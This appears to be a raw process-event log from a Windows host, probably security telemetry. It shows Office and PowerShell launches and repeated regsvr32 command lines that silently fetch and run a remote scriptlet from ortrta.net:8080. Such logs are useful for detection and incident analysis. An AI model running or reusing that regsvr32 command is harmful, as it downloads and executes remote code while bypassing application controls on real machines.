be8a065a-4d5c-8c0f-be93-150bd2a62931,{'subject': 'c:\\program files\\microsoft office\\office14\\excel.exe None'},651969
d55d435d-08d1-8108-b96c-77d2505dfb4f,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/fygPgMir5J.sct scrobj.dll'},655332
39204b8a-bc32-8c10-b98f-1f5df9860090,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/fygPgMir5J.sct scrobj.dll'},655375
60056e93-8075-856a-a7ea-5103281ca84d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},655374
60056e93-8075-856a-a7ea-5103281ca84d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},655374
d55d435d-08d1-8108-b96c-77d2505dfb4f,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/fygPgMir5J.sct scrobj.dll'},655332
39204b8a-bc32-8c10-b98f-1f5df9860090,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/fygPgMir5J.sct scrobj.dll'},655375
d55d435d-08d1-8108-b96c-77d2505dfb4f,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/fygPgMir5J.sct scrobj.dll'},655332
39204b8a-bc32-8c10-b98f-1f5df9860090,{'subject': 'c:\\windows\\system32\\regsvr32.exe regsvr32 /s /n /u /i:http://ortrta.net:8080/fygPgMir5J.sct scrobj.dll'},655375
60056e93-8075-856a-a7ea-5103281ca84d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},655374
61322bf2-d589-83f7-aa68-7eb43a3d3c31,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},655272
60056e93-8075-856a-a7ea-5103281ca84d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},655374
52e6ec24-95f3-8a83-b463-a456575c1a7f,{'subject': 'c:\\program files\\microsoft office\\office14\\winword.exe None'},655197
40d7d2cc-f0de-82d1-8b2d-87a8b3f3b885,{'subject': 'c:\\program files\\microsoft office\\office14\\excel.exe None'},651946
60056e93-8075-856a-a7ea-5103281ca84d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},655374
60056e93-8075-856a-a7ea-5103281ca84d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},655374
60056e93-8075-856a-a7ea-5103281ca84d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},655374
60056e93-8075-856a-a7ea-5103281ca84d,{'subject': 'c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe None'},655374
